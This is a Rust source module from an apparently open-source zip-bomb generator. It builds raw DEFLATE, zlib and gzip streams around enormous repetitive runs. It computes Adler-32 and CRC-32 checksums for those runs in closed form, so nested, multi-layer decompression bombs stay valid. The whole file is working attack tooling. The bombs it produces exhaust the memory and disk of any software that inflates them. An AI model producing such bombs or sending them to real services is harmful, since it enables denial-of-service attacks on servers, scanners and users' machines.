use num::BigUint;
use std::io;
use crate::payload::matrix::CrcMatrix;

mod matrix;

/* A block is a "fixed" piece of data. This includes things like file headers/tails, as well as
 * checksums. Bombs are only guaranteed to be valid if their corresponding payload is fully
 * initialized; that is to say that every bomb is populated. */
pub struct Block {
    data: BlockData,
    len: usize,
}

enum BlockData {
    Known(Box<[u8]>),
    Unfilled(Box<dyn Fn(Option<&mut Payload>) -> Box<[u8]>>),
}

/* A bomb is a very repetitive, highly compressible piece of data. The repeated bytes are an
 * immutable property of a bomb, the length can be populated. */
pub struct Bomb {
    data: Box<[u8]>,
    size: BigUint,

    /* Informs lower level payloads how many bytes they contain.
    *
    * Imagine a double-compressed zip bomb.
    *   Level 2: 1 byte
    *   Level 1: 1032 bytes
    *   Payload: 1065024 bytes
    *
    * level2.fill(1) would call level1.fill(1032) which calls payload.fill(1065024).
    *
    * The fill closure only informs the lower level of its size, it does not change the size of the
    * current payload.
    * */
    fill: Box<dyn Fn(Option<&mut Payload>, &BigUint)>,
}

/* A segment is either a block or a bomb */
pub enum Segment {
    Block(Block),
    Bomb(Bomb),
}

pub struct Payload {
    pub data: Box<[Segment]>,
    child: Option<Box<Payload>>,
}

impl Block {
    pub fn new(data: Box<[u8]>) -> Block {
        return Block {
            len: (&data).len(),
            data: BlockData::Known(data),
        };
    }

    pub fn fill(&mut self, child: Option<&mut Payload>) {
        if let BlockData::Unfilled(fill) = &mut self.data {
            self.data = BlockData::Known(fill(child));
        }
    }
}

impl Bomb {
    pub fn new(data: Box<[u8]>) -> Bomb {
        return Bomb {
            data: data,
            size: BigUint::ZERO,
            fill: Box::new(|_child, _size| {}),
        };
    }

    pub fn fill(&mut self, child: Option<&mut Payload>, size: &BigUint) {
        (self.fill)(child, size);
        self.size = size.clone();
    }
}

impl Payload {
    pub fn new(data: Box<[Segment]>) -> Payload {
        return Payload {
            data: data,
            child: Option::None,
        };
    }

    fn fill_preset(&mut self) {
        if let Option::Some(child) = &mut self.child {
            child.fill_preset();
        }
        for segment in (*self.data).iter_mut() {
            if let Segment::Block(b) = segment {
                if let Option::Some(child) = &mut self.child {
                    b.fill(Option::Some(child));
                } else {
                    b.fill(Option::None);
                }
            }
        }
    }

    pub fn fill(&mut self, bomb_size: &BigUint) {
        for segment in (*self.data).iter_mut() {
            if let Segment::Bomb(b) = segment {
                if let Option::Some(child) = &mut self.child {
                    b.fill(Option::Some(child), bomb_size);
                } else {
                    b.fill(Option::None, bomb_size);
                }
            }
        }
        self.fill_preset();
    }

    pub fn write(&self, output: &mut impl io::Write) -> usize {
        let mut size: usize = 0;
        for segment in (*self.data).iter() {
            match segment {
                Segment::Block(b) => {
                    let data: &[u8];
                    if let BlockData::Known(d) = &b.data {
                        data = d;
                    } else {
                        panic!("Trying to write uninitialized data");
                    }
                    let s = output.write(data).expect("Write failed!");
                    if s < data.len() {
                        panic!("Write failed");
                    }
                    size += s;
                }
                Segment::Bomb(b) => {
                    let mut i = BigUint::ZERO;
                    let mut idx = 0;
                    while i < b.size {
                        let slice = [b.data[idx]];
                        let s = output.write(&slice).expect("Write failed.");
                        if s < 1 {
                            panic!("Write failed");
                        }
                        size += 1;
                        idx = (idx + 1) % b.data.len();
                        i += 1 as usize;
                    }
                }
            }
        }
        return size
    }

    pub fn adler32(&self) -> [u8; 4] {
        let mut s0: u64 = 1;
        let mut s1: u64 = 0;
        for segment in (*self.data).iter() {
            match segment {
                Segment::Block(b) => {
                    let data: &[u8];
                    if let BlockData::Known(d) = &b.data {
                        data = d;
                    } else {
                        panic!("Calculating Adler32 of uninitialized block");
                    }
                    for byte in data {
                        s0 += *byte as u64;
                        s0 %= 65521;
                        s1 += s0;
                        s1 %= 65521;
                    }
                }
                Segment::Bomb(b) => {
                    /* This algorithm works, trust me */
                    let mut t0: u64 = 0;
                    let mut t1: u64 = 0;
                    for byte in &b.data {
                        t0 += *byte as u64;
                        t0 %= 65521;
                        t1 += t0;
                        t1 %= 65521;
                    }

                    let tri = t1;

                    let rect = t0 * (b.data.len() as u64);
                    let full_blocks_option = biguint_to_u64(
                            (b.size.clone() / b.data.len()) % (65521 as u64));
                    let full_blocks: u64;
                    if let Some(v) = full_blocks_option {
                        full_blocks = v;
                    } else {
                        panic!("Failed to convert BigUint to u64");
                    }
                    let extra_bytes_option = biguint_to_u64(b.size.clone() % b.data.len());
                    let extra_bytes: u64;
                    if let Some(v) = extra_bytes_option {
                        extra_bytes = v;
                    } else {
                        panic!("Failed to convert BigUint to u64");
                    }

                    let num_rects = (full_blocks * (full_blocks-1) * 32761) % 65521;

                    s1 += s0 * full_blocks * (b.data.len() as u64);
                    s0 += t0 * full_blocks;
                    s1 += tri * full_blocks + rect * num_rects;

                    s0 %= 65521;
                    s1 %= 65521;

                    for i in 0..extra_bytes {
                        s0 += b.data[i as usize] as u64;
                        s0 %= 65521;
                        s1 += s0;
                        s1 %= 65521;
                    }
                }
            }
        }

        let ret: [u8; 4] = [
            (s1 >> 8)  as u8,
            (s1 & 255) as u8,
            (s0 >> 8)  as u8,
            (s0 & 255) as u8,
        ];
        return ret;
    }

    pub fn crc32(&self) -> [u8; 4] {
        let mut crc: u32 = 0xffffffff;

        fn apply(crc: u32, byte: u8) -> u32 {
            let mut ret: u32 = crc ^ (byte as u32);
            for _i in 0..8 {
                if (ret & 1) != 0 {
                    ret = (ret >> 1) ^ 0xedb88320;
                } else {
                    ret = ret >> 1;
                }
            }
            return ret;
        }

        for segment in (*self.data).iter() {
            match segment {
                Segment::Block(b) => {
                    let data: &[u8];
                    if let BlockData::Known(d) = &b.data {
                        data = d;
                    } else {
                        panic!("Calculating CRC32 of uninitialized block");
                    }
                    for byte in data {
                        crc = apply(crc, *byte);
                    }
                }
                Segment::Bomb(b) => {
                    let mut matr = CrcMatrix::new();
                    let size = b.size.clone();
                    let full_blocks = &size / b.data.len();
                    let extra_bytes = biguint_to_u64(size % b.data.len())
                        .expect("Failed to convert biguint to u64");

                    for i in 0..b.data.len() {
                        let byte = b.data[b.data.len() - i - 1];
                        for j in 0..8 {
                            if (byte & (1 << (7 - j))) != 0 {
                                matr.push_1();
                            } else {
                                matr.push_0();
                            }
                        }
                    }

                    matr.exponentiate(&full_blocks);
                    crc = matr.apply(crc);

                    for i in 0..extra_bytes {
                        crc = apply(crc, b.data[i as usize]);
                    }
                }
            }
        }

        crc = !crc;
        return [
            (crc >> 0)  as u8,
            (crc >> 8)  as u8,
            (crc >> 16) as u8,
            (crc >> 24) as u8,
        ]
    }

    /* the size of this layer */
    pub fn size(&self) -> BigUint {
        let mut ret = BigUint::ZERO;
        for segment in (*self.data).iter() {
            match segment {
                Segment::Block(b) => {
                    ret += b.len;
                }
                Segment::Bomb(b) => {
                    ret += &b.size;
                }
            }
        }
        return ret;
    }

    /* the size of the final layer */
    pub fn final_size(&self) -> BigUint {
        if let Option::Some(child) = &self.child {
            return child.final_size();
        }

        return self.size();
    }
}

fn biguint_to_u64(num: BigUint) -> Option<u64> {
    let digits = num.to_u64_digits();
    if digits.len() == 0 {
        return Option::Some(0);
    }
    if digits.len() != 1 {
        return Option::None;
    }
    return Option::Some(digits[0]);
}

/* Every message can be expressed as a series of Block, Bomb(0x55), Block, Bomb(0x55), ...
 *
 * Each block contains literal blocks, as well as the header for the next Bomb block. The size of
 * the Block can be statically determined, but its contents are determined at fill time. */
fn deflate_to_vec(payload: &Payload, output: &mut Vec<Segment>) {
    let mut start = 0;
    while start < payload.data.len() {
        let mut end = start;
        let has_rep: bool;

        /* Find the bounds of this Block */
        loop {
            if end >= payload.data.len() {
                has_rep = false;
                break;
            }
            if let Segment::Bomb(b) = &payload.data[end] {
                if b.data.len() != 1 {
                    panic!("DEFLATE bomb has multibyte data");
                }
                has_rep = true;
                break;
            }
            end += 1;
        }

        /* Create this Block */
        let start_c = start;
        let mut payload_len: usize = 0;
        let mut data_len: usize = 0;
        let is_last = end+1 >= payload.data.len();

        for i in start..=end {
            if i >= payload.data.len() {
                break;
            }
            match &payload.data[i] {
                Segment::Block(b) => {
                    data_len += b.len;
                }
                Segment::Bomb(b) => {
                    data_len += b.data.len();
                }
            }
        }

        /* The maximum length of an uncompressed block is 0xffff bytes, each uncompressed block
         * header is 5 bytes. */
        let num_blocks = (data_len + 0xffff - 1) / 0xffff;
        payload_len += num_blocks * 5;
        payload_len += data_len;

        /* The length of the following Bomb header (if there is one) is 13 bytes. */
        if has_rep {
            payload_len += 13;
        }

        let gen_block = move |child_op: Option<&mut Payload>| -> Box<[u8]> {
            let mut ret: Vec<u8> = Vec::new();
            let mut last_block: usize = 0;
            let mut last_bit: u8 = 0;

            /* the block of the child we're writing */
            let mut child_idx: usize = start_c;
            /* the index within that block */
            let mut child_pos: usize = 0;

            let child = child_op.expect("Trying to fill a block with no child");

            /* if we saw a bomb last time, \x02 */
            if start_c != 0 {
                last_block = ret.len();
                last_bit = 0x20;
                ret.push(0x05);
            }

            let mut this_start = 0;
            while this_start < data_len {
                let this_end = std::cmp::min(this_start + 0xffff, data_len);
                let this_len = this_end - this_start;

                /* start of an uncompressed block. note that if the previous block was a bomb, we
                 * write these bits there. */
                if start_c == 0 || this_start != 0 {
                    last_block = ret.len();
                    last_bit = 0x01;
                    ret.push(0x00);
                }

                /* uncompressed block length */
                ret.push((this_len & 0xff) as u8);
                ret.push((this_len >> 8)   as u8);

                /* ones compliment of the block length */
                let inverse_len = !this_len;
                ret.push((inverse_len & 0xff) as u8);
                ret.push((inverse_len >> 8)   as u8);

                /* data of uncompressed block */
                for _i in this_start..this_end {
                    let byte: u8;
                    match &child.data[child_idx] {
                        Segment::Block(b) => {
                            if let BlockData::Known(data) = &b.data {
                                byte = data[child_pos];
                                child_pos += 1;
                                if child_pos >= data.len() {
                                    child_idx += 1;
                                    child_pos = 0;
                                }
                            } else {
                                panic!("Filling in block with unfilled child");
                            }
                        }
                        Segment::Bomb(b) => {
                            byte = b.data[child_pos];
                            child_pos += 1;
                            if child_pos >= b.data.len() {
                                child_idx += 1;
                                child_pos = 0;
                            }
                        }
                    }
                    ret.push(byte);
                }

                this_start = this_end;
            }

            if has_rep {
                /* there is a bomb after this, so we write the header of the next block */
                last_block = ret.len();
                ret.push(0xec);
                ret.push(0xc0);
                ret.push(0x81);
                ret.push(0x00);
                ret.push(0x00);
                ret.push(0x00);
                ret.push(0x00);
                ret.push(0x00);
                ret.push(0x90);
                ret.push(0xff);
                ret.push(0x6b);
                ret.push(0x23);
                ret.push(0x54);
            }

            if is_last {
                /* there is no bomb after this, so we set the BFINAL bit */
                ret[last_block] |= last_bit;
            }

            return ret.as_slice().into();
        };

        let block = Segment::Block(Block {
            data: BlockData::Unfilled(Box::new(gen_block)),
            len: payload_len,
        });
        output.push(block);

        if has_rep {
            let fill = move |child_op: Option<&mut Payload>, size: &BigUint| {
                let child_size = size * 1032u16 + 1291u16;
                let child = child_op.expect("Trying to fill DEFLATE bomb with no child");
                if let Segment::Bomb(b) =
                        &mut child.data[end] {
                    if let Option::Some(grandchild) = &mut child.child {
                        b.fill(Option::Some(grandchild), &child_size);
                    } else {
                        b.fill(Option::None, &child_size);
                    }
                }
            };

            let bomb = Segment::Bomb(Bomb {
                data: Box::new([0x55]),
                size: BigUint::ZERO,
                fill: Box::new(fill),
            });

            output.push(bomb);
        }

        start = end + 1;
    }

    if let Segment::Bomb(_b) = &payload.data[payload.data.len() - 1] {
        let f = Segment::Block(Block::new(Box::new([0x05])));
        output.push(f);
    }
}

pub fn deflate_raw(payload: Payload) -> Payload {
    let mut blocks = Vec::<Segment>::new();
    deflate_to_vec(&payload, &mut blocks);

    return Payload {
        data: blocks.into_boxed_slice(),
        child: Option::Some(Box::new(payload)),
    };
}

pub fn zlib(payload: Payload) -> Payload {
    let mut blocks = Vec::<Segment>::new();

    /* zlib header: DEFLATE, fastest compression */
    blocks.push(Segment::Block(Block::new(Box::new([
        0x08,  /* CMF */
        0x1d,  /* FLAGS */
    ]))));

    deflate_to_vec(&payload, &mut blocks);

    fn adler32(child_op: Option<&mut Payload>) -> Box<[u8]> {
        let child = child_op.expect("Calculating Adler-32 checksum of invalid child");
        return Box::new(child.adler32());
    }

    /* Adler-32 checksum */
    let checksum = Block {
        data: BlockData::Unfilled(Box::new(adler32)),
        len: 4,
    };
    blocks.push(Segment::Block(checksum));

    return Payload {
        data: blocks.into_boxed_slice(),
        child: Option::Some(Box::new(payload)),
    };
}

pub fn gzip(payload: Payload) -> Payload {
    let mut blocks = Vec::<Segment>::new();

    /* gzip header */
    blocks.push(Segment::Block(Block::new(Box::new([
        0x1f, 0x8b,              /* ID1, ID2 */
        0x08,                    /* CM (DEFLATE) */
        0x00,                    /* FLG (no flags) */
        0x00, 0x00, 0x00, 0x00,  /* MTIME (no time available) */
        0x02,                    /* XFL, maximum compression, slowest algorithm */
        0xff,                    /* OS (unknown) */
    ]))));

    deflate_to_vec(&payload, &mut blocks);

    fn crc32(child_op: Option<&mut Payload>) -> Box<[u8]> {
        let child = child_op.expect("Calculating CRC-32 checksum of invalid child");
        return Box::new(child.crc32());
    }

    /* CRC-32 checksum */
    let checksum = Block {
        data: BlockData::Unfilled(Box::new(crc32)),
        len: 4,
    };
    blocks.push(Segment::Block(checksum));

    /* ISIZE */
    fn len(child_op: Option<&mut Payload>) -> Box<[u8]> {
        let child = child_op.expect("Calculating length of invalid child");
        let len = child.size();
        let lenu32 = len.to_u32_digits()[0];
        return Box::new([
            (lenu32) as u8,
            (lenu32 >> 8) as u8,
            (lenu32 >> 16) as u8,
            (lenu32 >> 24) as u8,
        ]);
    }
    let length = Block {
        data: BlockData::Unfilled(Box::new(len)),
        len: 4,
    };
    blocks.push(Segment::Block(length));

    return Payload {
        data: blocks.into_boxed_slice(),
        child: Option::Some(Box::new(payload)),
    };
}
